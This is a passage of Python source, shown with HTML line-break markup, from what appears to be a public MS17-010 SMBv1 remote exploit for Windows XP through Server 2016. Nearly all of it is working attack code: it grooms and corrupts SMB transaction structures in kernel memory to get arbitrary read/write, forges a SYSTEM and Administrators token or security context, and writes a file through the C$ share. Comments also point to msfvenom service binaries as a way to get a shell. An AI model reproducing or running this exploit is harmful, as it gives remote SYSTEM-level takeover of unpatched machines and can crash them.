&#09;&#09;tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')<br/>
&#09;&#09;conn.set_default_tid(tid)<br/>
&#09;&#09;fid = conn.nt_create_andx(tid, pipe_name)<br/>
<br/>
&#09;if leakInfo is None:<br/>
&#09;&#09;return False<br/>
&#09;<br/>
&#09;info['fid'] = fid<br/>
&#09;info.update(leakInfo)<br/>
<br/>
&#09;# ================================<br/>
&#09;# shift transGroom.Indata ptr with SmbWriteAndX<br/>
&#09;# ================================<br/>
&#09;shift_indata_byte = 0x200<br/>
&#09;conn.do_write_andx_raw_pipe(fid, 'A'*shift_indata_byte)<br/>
<br/>
&#09;# Note: Even the distance between bride transaction is exactly what we want, the groom transaction might be in a wrong place.<br/>
&#09;# &nbsp; &nbsp; &nbsp; So the below operation is still dangerous. Write only 1 byte with '\x00' might be safe even alignment is wrong.<br/>
&#09;# maxParameterCount (0x1000), trans name (4), param (4)<br/>
&#09;indata_value = info['next_page_addr'] + info['TRANS_SIZE'] + 8 + info['SRV_BUFHDR_SIZE'] + 0x1000 + shift_indata_byte<br/>
&#09;indata_next_trans_displacement = info['trans2_addr'] - indata_value<br/>
&#09;conn.send_nt_trans_secondary(mid=fid, data='\x00', dataDisplacement=indata_next_trans_displacement + info['TRANS_MID_OFFSET'])<br/>
&#09;wait_for_request_processed(conn)<br/>
<br/>
&#09;# if the overwritten is correct, a modified transaction mid should be special_mid now.<br/>
&#09;# a new transaction with special_mid should be error.<br/>
&#09;recvPkt = conn.send_nt_trans(5, mid=special_mid, param=pack('&lt;HH', fid, 0), data='')<br/>
&#09;if recvPkt.getNTStatus() != 0x10002: &nbsp;# invalid SMB<br/>
&#09;&#09;print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))<br/>
&#09;&#09;print('!!! Write to wrong place !!!')<br/>
&#09;&#09;print('the target might be crashed')<br/>
&#09;&#09;return False<br/>
<br/>
&#09;print('success controlling groom transaction')<br/>
<br/>
&#09;# NSA exploit set refCnt on leaked transaction to very large number for reading data repeatly<br/>
&#09;# but this method make the transation never get freed<br/>
&#09;# I will avoid memory leak<br/>
&#09;<br/>
&#09;# ================================<br/>
&#09;# modify trans1 struct to be used for arbitrary read/write<br/>
&#09;# ================================<br/>
&#09;print('modify trans1 struct for arbitrary read/write')<br/>
&#09;fmt = info['PTR_FMT']<br/>
&#09;# use transGroom to modify trans2.InData to &amp;trans1. so we can modify trans1 with trans2 data<br/>
&#09;conn.send_nt_trans_secondary(mid=fid, data=pack('&lt;'+fmt, info['trans1_addr']), dataDisplacement=indata_next_trans_displacement + info['TRANS_INDATA_OFFSET'])<br/>
&#09;wait_for_request_processed(conn)<br/>
<br/>
&#09;# modify<br/>
&#09;# - trans1.InParameter to &amp;trans1. so we can modify trans1 struct with itself (trans1 param)<br/>
&#09;# - trans1.InData to &amp;trans2. so we can modify trans2 with trans1 data<br/>
&#09;conn.send_nt_trans_secondary(mid=special_mid, data=pack('&lt;'+fmt*3, info['trans1_addr'], info['trans1_addr']+0x200, info['trans2_addr']), dataDisplacement=info['TRANS_INPARAM_OFFSET'])<br/>
&#09;wait_for_request_processed(conn)<br/>
<br/>
&#09;# modify trans2.mid<br/>
&#09;info['trans2_mid'] = conn.next_mid()<br/>
&#09;conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('&lt;H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])<br/>
&#09;return True<br/>
<br/>
def exploit_fish_barrel(conn, pipe_name, info):<br/>
&#09;# for Windows Vista/2008 and earlier<br/>
&#09;<br/>
&#09;tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')<br/>
&#09;conn.set_default_tid(tid)<br/>
&#09;# fid for first open is always 0x4000. We can open named pipe multiple times to get other fids.<br/>
&#09;fid = conn.nt_create_andx(tid, pipe_name)<br/>
&#09;info['fid'] = fid<br/>
<br/>
&#09;if info['os'] == 'WIN7' and 'arch' not in info:<br/>
&#09;&#09;# leak_frag_size() can be used against Windows Vista/2008 to determine target architecture<br/>
&#09;&#09;info.update(leak_frag_size(conn, tid, fid))<br/>
&#09;<br/>
&#09;if 'arch' in info:<br/>
&#09;&#09;# add os and arch specific exploit info<br/>
&#09;&#09;info.update(OS_ARCH_INFO[info['os']][info['arch']])<br/>
&#09;&#09;attempt_list = [ OS_ARCH_INFO[info['os']][info['arch']] ]<br/>
&#09;else:<br/>
&#09;&#09;# do not know target architecture<br/>
&#09;&#09;# this case is only for Windows 2003<br/>
&#09;&#09;# try offset of 64 bit then 32 bit because no target architecture<br/>
&#09;&#09;attempt_list = [ OS_ARCH_INFO[info['os']]['x64'], OS_ARCH_INFO[info['os']]['x86'] ]<br/>
&#09;<br/>
&#09;# ================================<br/>
&#09;# groom packets<br/>
&#09;# ================================<br/>
&#09;# sum of transaction name, parameters and data length is 0x1000<br/>
&#09;# paramterCount = 0x100-TRANS_NAME_LEN<br/>
&#09;print('Groom packets')<br/>
&#09;trans_param = pack('&lt;HH', info['fid'], 0)<br/>
&#09;for i in range(12):<br/>
&#09;&#09;mid = info['fid'] if i == 8 else next_extra_mid()<br/>
&#09;&#09;conn.send_trans('', mid=mid, param=trans_param, totalParameterCount=0x100-TRANS_NAME_LEN, totalDataCount=0xec0, maxParameterCount=0x40, maxDataCount=0)&#09;<br/>
&#09;<br/>
&#09;# expected transactions alignment<br/>
&#09;#<br/>
&#09;# &nbsp; &nbsp;+-----------+-----------+-----...-----+-----------+-----------+-----------+-----------+-----------+<br/>
&#09;# &nbsp; &nbsp;| &nbsp;mid=mid1 | &nbsp;mid=mid2 | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | &nbsp;mid=mid8 | &nbsp;mid=fid &nbsp;| &nbsp;mid=mid9 | mid=mid10 | mid=mid11 |<br/>
&#09;# &nbsp; &nbsp;+-----------+-----------+-----...-----+-----------+-----------+-----------+-----------+-----------+<br/>
&#09;# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; trans1 &nbsp; &nbsp; &nbsp; trans2<br/>
<br/>
&#09;# ================================<br/>
&#09;# shift transaction Indata ptr with SmbWriteAndX<br/>
&#09;# ================================<br/>
&#09;shift_indata_byte = 0x200<br/>
&#09;conn.do_write_andx_raw_pipe(info['fid'], 'A'*shift_indata_byte)<br/>
&#09;<br/>
&#09;# ================================<br/>
&#09;# Dangerous operation: attempt to control one transaction<br/>
&#09;# ================================<br/>
&#09;# Note: POOL_ALIGN value is same as heap alignment value<br/>
&#09;success = False<br/>
&#09;for tinfo in attempt_list:<br/>
&#09;&#09;print('attempt controlling next transaction on ' + tinfo['ARCH'])<br/>
&#09;&#09;HEAP_CHUNK_PAD_SIZE = (tinfo['POOL_ALIGN'] - (tinfo['TRANS_SIZE']+HEAP_HDR_SIZE) % tinfo['POOL_ALIGN']) % tinfo['POOL_ALIGN']<br/>
&#09;&#09;NEXT_TRANS_OFFSET = 0xf00 - shift_indata_byte + HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE<br/>
<br/>
&#09;&#09;# Below operation is dangerous. Write only 1 byte with '\x00' might be safe even alignment is wrong.<br/>
&#09;&#09;conn.send_trans_secondary(mid=info['fid'], data='\x00', dataDisplacement=NEXT_TRANS_OFFSET+tinfo['TRANS_MID_OFFSET'])<br/>
&#09;&#09;wait_for_request_processed(conn)<br/>
<br/>
&#09;&#09;# if the overwritten is correct, a modified transaction mid should be special_mid now.<br/>
&#09;&#09;# a new transaction with special_mid should be error.<br/>
&#09;&#09;recvPkt = conn.send_nt_trans(5, mid=special_mid, param=trans_param, data='')<br/>
&#09;&#09;if recvPkt.getNTStatus() == 0x10002: &nbsp;# invalid SMB<br/>
&#09;&#09;&#09;print('success controlling one transaction')<br/>
&#09;&#09;&#09;success = True<br/>
&#09;&#09;&#09;if 'arch' not in info:<br/>
&#09;&#09;&#09;&#09;print('Target is '+tinfo['ARCH'])<br/>
&#09;&#09;&#09;&#09;info['arch'] = tinfo['ARCH']<br/>
&#09;&#09;&#09;&#09;info.update(OS_ARCH_INFO[info['os']][info['arch']])<br/>
&#09;&#09;&#09;break<br/>
&#09;&#09;if recvPkt.getNTStatus() != 0:<br/>
&#09;&#09;&#09;print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))<br/>
&#09;<br/>
&#09;if not success:<br/>
&#09;&#09;print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))<br/>
&#09;&#09;print('!!! Write to wrong place !!!')<br/>
&#09;&#09;print('the target might be crashed')<br/>
&#09;&#09;return False<br/>
<br/>
<br/>
&#09;# NSA eternalromance modify transaction RefCount to keep controlled and reuse transaction after leaking info.<br/>
&#09;# This is easy to to but the modified transaction will never be freed. The next exploit attempt might be harder<br/>
&#09;# &nbsp; because of this unfreed memory chunk. I will avoid it.<br/>
&#09;<br/>
&#09;# From a picture above, now we can only control trans2 by trans1 data. Also we know only offset of these two <br/>
&#09;# transactions (do not know the address).<br/>
&#09;# After reading memory by modifying and completing trans2, trans2 cannot be used anymore.<br/>
&#09;# To be able to use trans1 after trans2 is gone, we need to modify trans1 to be able to modify itself.<br/>
&#09;# To be able to modify trans1 struct, we need to use trans2 param or data but write backward.<br/>
&#09;# On 32 bit target, we can write to any address if parameter count is 0xffffffff.<br/>
&#09;# On 64 bit target, modifying paramter count is not enough because address size is 64 bit. Because our transactions<br/>
&#09;# &nbsp; are allocated with RtlAllocateHeap(), the HIDWORD of InParameter is always 0. To be able to write backward with offset only,<br/>
&#09;# &nbsp; we also modify HIDWORD of InParameter to 0xffffffff.<br/>
&#09;<br/>
&#09;print('modify parameter count to 0xffffffff to be able to write backward')<br/>
&#09;conn.send_trans_secondary(mid=info['fid'], data='\xff'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_TOTALPARAMCNT_OFFSET'])<br/>
&#09;# on 64 bit, modify InParameter last 4 bytes to \xff\xff\xff\xff too<br/>
&#09;if info['arch'] == 'x64':<br/>
&#09;&#09;conn.send_trans_secondary(mid=info['fid'], data='\xff'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)<br/>
&#09;wait_for_request_processed(conn)<br/>
&#09;<br/>
&#09;TRANS_CHUNK_SIZE = HEAP_HDR_SIZE + info['TRANS_SIZE'] + 0x1000 + HEAP_CHUNK_PAD_SIZE<br/>
&#09;PREV_TRANS_DISPLACEMENT = TRANS_CHUNK_SIZE + info['TRANS_SIZE'] + TRANS_NAME_LEN<br/>
&#09;PREV_TRANS_OFFSET = 0x100000000 - PREV_TRANS_DISPLACEMENT<br/>
<br/>
&#09;# modify paramterCount of first transaction<br/>
&#09;conn.send_nt_trans_secondary(mid=special_mid, param='\xff'*4, paramDisplacement=PREV_TRANS_OFFSET+info['TRANS_TOTALPARAMCNT_OFFSET'])<br/>
&#09;if info['arch'] == 'x64':<br/>
&#09;&#09;conn.send_nt_trans_secondary(mid=special_mid, param='\xff'*4, paramDisplacement=PREV_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)<br/>
&#09;&#09;# restore trans2.InParameters pointer before leaking next transaction<br/>
&#09;&#09;conn.send_trans_secondary(mid=info['fid'], data='\x00'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)<br/>
&#09;wait_for_request_processed(conn)<br/>
<br/>
&#09;# ================================<br/>
&#09;# leak transaction<br/>
&#09;# ================================<br/>
&#09;print('leak next transaction')<br/>
&#09;# modify TRANSACTION member to leak info<br/>
&#09;# function=5 (NT_TRANS_RENAME)<br/>
&#09;conn.send_trans_secondary(mid=info['fid'], data='\x05', dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_FUNCTION_OFFSET'])<br/>
&#09;# parameterCount, totalParameterCount, maxParameterCount, dataCount, totalDataCount<br/>
&#09;conn.send_trans_secondary(mid=info['fid'], data=pack('&lt;IIIII', 4, 4, 4, 0x100, 0x100), dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_PARAMCNT_OFFSET'])<br/>
<br/>
&#09;conn.send_nt_trans_secondary(mid=special_mid)<br/>
&#09;leakData = conn.recv_transaction_data(special_mid, 0x100)<br/>
&#09;leakData = leakData[4:] &nbsp;# remove param<br/>
&#09;#open('leak.dat', 'wb').write(leakData)<br/>
<br/>
&#09;# check heap chunk size value in leak data<br/>
&#09;if unpack_from('&lt;H', leakData, HEAP_CHUNK_PAD_SIZE)[0] != (TRANS_CHUNK_SIZE // info['POOL_ALIGN']):<br/>
&#09;&#09;print('chunk size is wrong')<br/>
&#09;&#09;return False<br/>
<br/>
&#09;# extract leak transaction data and make next transaction to be trans2<br/>
&#09;leakTranOffset = HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE<br/>
&#09;leakTrans = leakData[leakTranOffset:]<br/>
&#09;fmt = info['PTR_FMT']<br/>
&#09;_, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('&lt;'+fmt*5, leakTrans, 8)<br/>
&#09;inparam_value, outparam_value, indata_value = unpack_from('&lt;'+fmt*3, leakTrans, info['TRANS_INPARAM_OFFSET'])<br/>
&#09;trans2_mid = unpack_from('&lt;H', leakTrans, info['TRANS_MID_OFFSET'])[0]<br/>
&#09;<br/>
&#09;print('CONNECTION: 0x{:x}'.format(connection_addr))<br/>
&#09;print('SESSION: 0x{:x}'.format(session_addr))<br/>
&#09;print('FLINK: 0x{:x}'.format(flink_value))<br/>
&#09;print('InData: 0x{:x}'.format(indata_value))<br/>
&#09;print('MID: 0x{:x}'.format(trans2_mid))<br/>
&#09;<br/>
&#09;trans2_addr = inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN<br/>
&#09;trans1_addr = trans2_addr - TRANS_CHUNK_SIZE * 2<br/>
&#09;print('TRANS1: 0x{:x}'.format(trans1_addr))<br/>
&#09;print('TRANS2: 0x{:x}'.format(trans2_addr))<br/>
&#09;<br/>
&#09;# ================================<br/>
&#09;# modify trans struct to be used for arbitrary read/write<br/>
&#09;# ================================<br/>
&#09;print('modify transaction struct for arbitrary read/write')<br/>
&#09;# modify<br/>
&#09;# - trans1.InParameter to &amp;trans1. so we can modify trans1 struct with itself (trans1 param)<br/>
&#09;# - trans1.InData to &amp;trans2. so we can modify trans2 with trans1 data<br/>
&#09;# Note: HIDWORD of trans1.InParameter is still 0xffffffff<br/>
&#09;TRANS_OFFSET = 0x100000000 - (info['TRANS_SIZE'] + TRANS_NAME_LEN)<br/>
&#09;conn.send_nt_trans_secondary(mid=info['fid'], param=pack('&lt;'+fmt*3, trans1_addr, trans1_addr+0x200, trans2_addr), paramDisplacement=TRANS_OFFSET+info['TRANS_INPARAM_OFFSET'])<br/>
&#09;wait_for_request_processed(conn)<br/>
&#09;<br/>
&#09;# modify trans1.mid<br/>
&#09;trans1_mid = conn.next_mid()<br/>
&#09;conn.send_trans_secondary(mid=info['fid'], param=pack('&lt;H', trans1_mid), paramDisplacement=info['TRANS_MID_OFFSET'])<br/>
&#09;wait_for_request_processed(conn)<br/>
&#09;<br/>
&#09;info.update({<br/>
&#09;&#09;'connection': connection_addr,<br/>
&#09;&#09;'session': session_addr,<br/>
&#09;&#09;'trans1_mid': trans1_mid,<br/>
&#09;&#09;'trans1_addr': trans1_addr,<br/>
&#09;&#09;'trans2_mid': trans2_mid,<br/>
&#09;&#09;'trans2_addr': trans2_addr,<br/>
&#09;})<br/>
&#09;return True<br/>
<br/>
def create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroupsAddr):<br/>
&#09;SID_SYSTEM = pack('&lt;BB5xB'+'I', 1, 1, 5, 18)<br/>
&#09;SID_ADMINISTRATORS = pack('&lt;BB5xB'+'II', 1, 2, 5, 32, 544)<br/>
&#09;SID_AUTHENICATED_USERS = pack('&lt;BB5xB'+'I', 1, 1, 5, 11)<br/>
&#09;SID_EVERYONE = pack('&lt;BB5xB'+'I', 1, 1, 1, 0)<br/>
&#09;# SID_SYSTEM and SID_ADMINISTRATORS must be added<br/>
&#09;sids = [ SID_SYSTEM, SID_ADMINISTRATORS, SID_EVERYONE, SID_AUTHENICATED_USERS ]<br/>
&#09;# - user has no attribute (0)<br/>
&#09;# - 0xe: SE_GROUP_OWNER | SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT<br/>
&#09;# - 0x7: SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY<br/>
&#09;attrs = [ 0, 0xe, 7, 7 ]<br/>
&#09;<br/>
&#09;# assume its space is enough for SID_SYSTEM and SID_ADMINISTRATORS (no check)<br/>
&#09;# fake user and groups will be in same buffer of original one<br/>
&#09;# so fake sids size must NOT be bigger than the original sids<br/>
&#09;fakeUserAndGroupCount = min(userAndGroupCount, 4)<br/>
&#09;fakeUserAndGroupsAddr = userAndGroupsAddr<br/>
&#09;<br/>
&#09;addr = fakeUserAndGroupsAddr + (fakeUserAndGroupCount * info['PTR_SIZE'] * 2)<br/>
&#09;fakeUserAndGroups = ''<br/>
&#09;for sid, attr in zip(sids[:fakeUserAndGroupCount], attrs[:fakeUserAndGroupCount]):<br/>
&#09;&#09;fakeUserAndGroups += pack('&lt;'+info['PTR_FMT']*2, addr, attr)<br/>
&#09;&#09;addr += len(sid)<br/>
&#09;fakeUserAndGroups += ''.join(sids[:fakeUserAndGroupCount])<br/>
&#09;<br/>
&#09;return fakeUserAndGroupCount, fakeUserAndGroups<br/>
<br/>
<br/>
def exploit(target, pipe_name):<br/>
&#09;conn = MYSMB(target)<br/>
&#09;<br/>
&#09;# set NODELAY to make exploit much faster<br/>
&#09;conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)<br/>
<br/>
&#09;info = {}<br/>
<br/>
&#09;conn.login(USERNAME, PASSWORD, maxBufferSize=4356)<br/>
&#09;server_os = conn.get_server_os()<br/>
&#09;print('Target OS: '+server_os)<br/>
&#09;if server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 R2"):<br/>
&#09;&#09;info['os'] = 'WIN7'<br/>
&#09;&#09;info['method'] = exploit_matched_pairs<br/>
&#09;elif server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ") or server_os.startswith("Windows Server 2016 ") or server_os.startswith("Windows 10") or server_os.startswith("Windows RT 9200"):<br/>
&#09;&#09;info['os'] = 'WIN8'<br/>
&#09;&#09;info['method'] = exploit_matched_pairs<br/>
&#09;elif server_os.startswith("Windows Server (R) 2008") or server_os.startswith('Windows Vista'):<br/>
&#09;&#09;info['os'] = 'WIN7'<br/>
&#09;&#09;info['method'] = exploit_fish_barrel<br/>
&#09;elif server_os.startswith("Windows Server 2003 "):<br/>
&#09;&#09;info['os'] = 'WIN2K3'<br/>
&#09;&#09;info['method'] = exploit_fish_barrel<br/>
&#09;elif server_os.startswith("Windows 5.1"):<br/>
&#09;&#09;info['os'] = 'WINXP'<br/>
&#09;&#09;info['arch'] = 'x86'<br/>
&#09;&#09;info['method'] = exploit_fish_barrel<br/>
&#09;elif server_os.startswith("Windows XP "):<br/>
&#09;&#09;info['os'] = 'WINXP'<br/>
&#09;&#09;info['arch'] = 'x64'<br/>
&#09;&#09;info['method'] = exploit_fish_barrel<br/>
&#09;elif server_os.startswith("Windows 5.0"):<br/>
&#09;&#09;info['os'] = 'WIN2K'<br/>
&#09;&#09;info['arch'] = 'x86'<br/>
&#09;&#09;info['method'] = exploit_fish_barrel<br/>
&#09;else:<br/>
&#09;&#09;print('This exploit does not support this target')<br/>
&#09;&#09;sys.exit()<br/>
&#09;<br/>
&#09;if pipe_name is None:<br/>
&#09;&#09;pipe_name = find_named_pipe(conn)<br/>
&#09;&#09;if pipe_name is None:<br/>
&#09;&#09;&#09;print('Not found accessible named pipe')<br/>
&#09;&#09;&#09;return False<br/>
&#09;&#09;print('Using named pipe: '+pipe_name)<br/>
<br/>
&#09;if not info['method'](conn, pipe_name, info):<br/>
&#09;&#09;return False<br/>
<br/>
&#09;# Now, read_data() and write_data() can be used for arbitrary read and write.<br/>
&#09;# ================================<br/>
&#09;# Modify this SMB session to be SYSTEM<br/>
&#09;# ================================&#09;<br/>
&#09;fmt = info['PTR_FMT']<br/>
&#09;<br/>
&#09;print('make this SMB session to be SYSTEM')<br/>
&#09;# IsNullSession = 0, IsAdmin = 1<br/>
&#09;write_data(conn, info, info['session']+info['SESSION_ISNULL_OFFSET'], '\x00\x01')<br/>
<br/>
&#09;# read session struct to get SecurityContext address<br/>
&#09;sessionData = read_data(conn, info, info['session'], 0x100)<br/>
&#09;secCtxAddr = unpack_from('&lt;'+fmt, sessionData, info['SESSION_SECCTX_OFFSET'])[0]<br/>
<br/>
&#09;if 'PCTXTHANDLE_TOKEN_OFFSET' in info:<br/>
&#09;&#09;# Windows 2003 and earlier uses only ImpersonateSecurityContext() (with PCtxtHandle struct) for impersonation<br/>
&#09;&#09;# Modifying token seems to be difficult. But writing kernel shellcode for all old Windows versions is<br/>
&#09;&#09;# much more difficult because data offset in ETHREAD/EPROCESS is different between service pack.<br/>
&#09;&#09;<br/>
&#09;&#09;# find the token and modify it<br/>
&#09;&#09;if 'SECCTX_PCTXTHANDLE_OFFSET' in info:<br/>
&#09;&#09;&#09;pctxtDataInfo = read_data(conn, info, secCtxAddr+info['SECCTX_PCTXTHANDLE_OFFSET'], 8)<br/>
&#09;&#09;&#09;pctxtDataAddr = unpack_from('&lt;'+fmt, pctxtDataInfo)[0]<br/>
&#09;&#09;else:<br/>
&#09;&#09;&#09;pctxtDataAddr = secCtxAddr<br/>
<br/>
&#09;&#09;tokenAddrInfo = read_data(conn, info, pctxtDataAddr+info['PCTXTHANDLE_TOKEN_OFFSET'], 8)<br/>
&#09;&#09;tokenAddr = unpack_from('&lt;'+fmt, tokenAddrInfo)[0]<br/>
&#09;&#09;print('current TOKEN addr: 0x{:x}'.format(tokenAddr))<br/>
&#09;&#09;<br/>
&#09;&#09;# copy Token data for restoration<br/>
&#09;&#09;tokenData = read_data(conn, info, tokenAddr, 0x40*info['PTR_SIZE'])<br/>
&#09;&#09;<br/>
&#09;&#09;# parse necessary data out of token<br/>
&#09;&#09;userAndGroupsAddr, userAndGroupCount, userAndGroupsAddrOffset, userAndGroupCountOffset = get_group_data_from_token(info, tokenData)<br/>
<br/>
&#09;&#09;print('overwriting token UserAndGroups')<br/>
&#09;&#09;# modify UserAndGroups info<br/>
&#09;&#09;fakeUserAndGroupCount, fakeUserAndGroups = create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroupsAddr)<br/>
&#09;&#09;if fakeUserAndGroupCount != userAndGroupCount:<br/>
&#09;&#09;&#09;write_data(conn, info, tokenAddr+userAndGroupCountOffset, pack('&lt;I', fakeUserAndGroupCount))<br/>
&#09;&#09;write_data(conn, info, userAndGroupsAddr, fakeUserAndGroups)<br/>
&#09;else:<br/>
&#09;&#09;# the target can use PsImperonateClient for impersonation (Windows 2008 and later)<br/>
&#09;&#09;# copy SecurityContext for restoration<br/>
&#09;&#09;secCtxData = read_data(conn, info, secCtxAddr, info['SECCTX_SIZE'])<br/>
<br/>
&#09;&#09;print('overwriting session security context')<br/>
&#09;&#09;# see FAKE_SECCTX detail at top of the file<br/>
&#09;&#09;write_data(conn, info, secCtxAddr, info['FAKE_SECCTX'])<br/>
<br/>
&#09;# ================================<br/>
&#09;# do whatever we want as SYSTEM over this SMB connection<br/>
&#09;# ================================&#09;<br/>
&#09;try:<br/>
&#09;&#09;smb_pwn(conn, info['arch'])<br/>
&#09;except:<br/>
&#09;&#09;pass<br/>
<br/>
&#09;# restore SecurityContext/Token<br/>
&#09;if 'PCTXTHANDLE_TOKEN_OFFSET' in info:<br/>
&#09;&#09;userAndGroupsOffset = userAndGroupsAddr - tokenAddr<br/>
&#09;&#09;write_data(conn, info, userAndGroupsAddr, tokenData[userAndGroupsOffset:userAndGroupsOffset+len(fakeUserAndGroups)])<br/>
&#09;&#09;if fakeUserAndGroupCount != userAndGroupCount:<br/>
&#09;&#09;&#09;write_data(conn, info, tokenAddr+userAndGroupCountOffset, pack('&lt;I', userAndGroupCount))<br/>
&#09;else:<br/>
&#09;&#09;write_data(conn, info, secCtxAddr, secCtxData)<br/>
<br/>
&#09;conn.disconnect_tree(conn.get_tid())<br/>
&#09;conn.logoff()<br/>
&#09;conn.get_socket().close()<br/>
&#09;return True<br/>
<br/>
def validate_token_offset(info, tokenData, userAndGroupCountOffset, userAndGroupsAddrOffset):<br/>
&#09;# struct _TOKEN:<br/>
&#09;#&#09;...<br/>
&#09;#&#09;ULONG UserAndGroupCount; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;// Ro: 4-Bytes<br/>
&#09;#&#09;ULONG RestrictedSidCount; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Ro: 4-Bytes<br/>
&#09;# &#09;...<br/>
&#09;#&#09;PSID_AND_ATTRIBUTES UserAndGroups; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;// Wr: sizeof(void*)<br/>
&#09;#&#09;PSID_AND_ATTRIBUTES RestrictedSids; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Ro: sizeof(void*)<br/>
&#09;#&#09;...<br/>
<br/>
&#09;userAndGroupCount, RestrictedSidCount = unpack_from('&lt;II', tokenData, userAndGroupCountOffset) <br/>
&#09;userAndGroupsAddr, RestrictedSids = unpack_from('&lt;'+info['PTR_FMT']*2, tokenData, userAndGroupsAddrOffset)<br/>
<br/>
&#09;# RestrictedSidCount &#09;MUST be 0<br/>
&#09;# RestrictedSids &#09;MUST be NULL<br/>
&#09;#<br/>
&#09;# userandGroupCount &#09;must NOT be 0<br/>
&#09;# userandGroupsAddr &#09;must NOT be NULL<br/>
&#09;#<br/>
&#09;# Could also add a failure point here if userAndGroupCount &gt;= x<br/>
<br/>
&#09;success = True<br/>
<br/>
&#09;if RestrictedSidCount != 0 or RestrictedSids != 0 or userAndGroupCount == 0 or userAndGroupsAddr == 0:<br/>
&#09;&#09;print('Bad TOKEN_USER_GROUP offsets detected while parsing tokenData!')<br/>
&#09;&#09;print('RestrictedSids: 0x{:x}'.format(RestrictedSids))<br/>
&#09;&#09;print('RestrictedSidCount: 0x{:x}'.format(RestrictedSidCount))<br/>
&#09;&#09;success = False<br/>
<br/>
&#09;print('userAndGroupCount: 0x{:x}'.format(userAndGroupCount))<br/>
&#09;print('userAndGroupsAddr: 0x{:x}'.format(userAndGroupsAddr))<br/>
<br/>
&#09;return success, userAndGroupCount, userAndGroupsAddr <br/>
<br/>
def get_group_data_from_token(info, tokenData):<br/>
&#09;userAndGroupCountOffset = info['TOKEN_USER_GROUP_CNT_OFFSET']<br/>
&#09;userAndGroupsAddrOffset = info['TOKEN_USER_GROUP_ADDR_OFFSET']<br/>
<br/>
&#09;# try with default offsets<br/>
&#09;success, userAndGroupCount, userAndGroupsAddr = validate_token_offset(info, tokenData, userAndGroupCountOffset, userAndGroupsAddrOffset)<br/>
<br/>
&#09;# hack to fix XP SP0 and SP1<br/>
&#09;# I will avoid over-engineering a more elegant solution and leave this as a hack, <br/>
&#09;# since XP SP0 and SP1 is the only edge case in a LOT of testing!<br/>
&#09;if not success and info['os'] == 'WINXP' and info['arch'] == 'x86':<br/>
&#09;&#09;print('Attempting WINXP SP0/SP1 x86 TOKEN_USER_GROUP workaround')<br/>
<br/>
&#09;&#09;userAndGroupCountOffset = info['TOKEN_USER_GROUP_CNT_OFFSET_SP0_SP1']<br/>
&#09;&#09;userAndGroupsAddrOffset = info['TOKEN_USER_GROUP_ADDR_OFFSET_SP0_SP1']<br/>
<br/>
&#09;&#09;# try with hack offsets<br/>
&#09;&#09;success, userAndGroupCount, userAndGroupsAddr = validate_token_offset(info, tokenData, userAndGroupCountOffset, userAndGroupsAddrOffset)<br/>
<br/>
&#09;# still no good. Abort because something is wrong<br/>
&#09;if not success:<br/>
&#09;&#09;print('Bad TOKEN_USER_GROUP offsets. Abort &gt; BSOD')<br/>
&#09;&#09;sys.exit()<br/>
<br/>
&#09;# token parsed and validated<br/>
&#09;return userAndGroupsAddr, userAndGroupCount, userAndGroupsAddrOffset, userAndGroupCountOffset<br/>
<br/>
def smb_pwn(conn, arch):<br/>
&#09;smbConn = conn.get_smbconnection()<br/>
&#09;<br/>
&#09;print('creating file c:\\pwned.txt on the target')<br/>
&#09;tid2 = smbConn.connectTree('C$')<br/>
&#09;fid2 = smbConn.createFile(tid2, '/pwned.txt')<br/>
&#09;smbConn.closeFile(tid2, fid2)<br/>
&#09;smbConn.disconnectTree(tid2)<br/>
&#09;<br/>
&#09;<b>#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')<br/>
</b><b>&#09;#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')</b><br/>
&#09;# Note: there are many methods to get shell over SMB admin session<br/>
&#09;# a simple method to get shell (but easily to be detected by AV) is<br/>
&#09;# executing binary generated by "msfvenom -f exe-service ..."<br/>
<br/>
def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):<br/>
&#09;with open(localSrc, 'rb') as fp:<br/>
